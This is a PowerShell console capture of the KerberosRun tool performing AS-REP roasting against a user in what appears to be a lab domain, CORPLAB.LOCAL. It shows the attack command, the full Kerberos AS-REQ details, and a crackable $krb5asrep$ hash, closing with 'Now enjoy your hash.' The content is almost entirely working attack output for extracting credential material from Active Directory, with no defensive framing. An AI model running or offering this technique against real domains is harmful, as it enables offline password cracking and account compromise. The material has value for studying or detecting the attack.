```powershell
PS C:\Users> .\KerberosRun.exe --asreproast --user normaluser --verbose

   __           __
  / /_____ ____/ /  ___ _______  ___ ______ _____
 /  '_/ -_) __/ _ \/ -_) __/ _ \(_-</ __/ // / _ \
/_/\_\\__/_/ /_.__/\__/_/  \___/___/_/  \_,_/_//_/

  v1.0.0
[*] Starting Kerberos Authentication ...
[*] Sending AS-REQ ...
    * MessageType :  KRB_AS_REQ
    * pvno :  5
    * PaData :
       - PA_PAC_REQUEST :
          - IncludePac :  True
    * Body :
       - KdcOptions :  RenewableOk, Canonicalize, Renewable, Forwardable
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  normaluser
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :  9/13/2037 2:48:05 AM +00:00
       - Nonce :  637261654
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - Addresses :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - AdditionalTickets :
       - EncAuthorizationData :
       - From :
[*] Receiving AS-REP...
[+] ASREPRoasting Hash: $krb5asrep$23$normaluser@corplab.local:29D78179FA685E862D40EEAE60F97558$DE3E0F7C41C7C0D80B62E93F5FED7FB0CF8C8B197B6F163360E447F71F669A484D164426CB9855F40684FEC8827EED3A37BB0A8EC646CB3470468A9F8B8065FF86ABDCA096B1B7C0341732FC8DCCFAED97F8F09AD194324EC7408FAC6B7EEC34F9AAB3A1A66C76B45A671F29F84E3FD45EFA7F15A9D9F30EFEDF5BFDAC8388BA96A50EB767638B252E649AAE83DE57E06692857FED01AC37DCD73F460B43FE3A57501BCEB916B4EF92886138A6BFC0D0C2ADFDB9057283A472EEA71BDB17C17C707E99B4C30429563801EF60743A973C307FEBAF60D0798616143DFC5E85EC03F1801B1A7625B234BAE00CC616A4CA55D5DA8D6E01C663CE365A38E0C77BD288CE9DE898A4CA1C1805F7BD87DD4176D7FEA39833D4511BB72DC7F4B3665B2211DB2276FA74CB95BE6EAF05367C557067BC198600E4A780
[+] Done! Now enjoy your hash.

```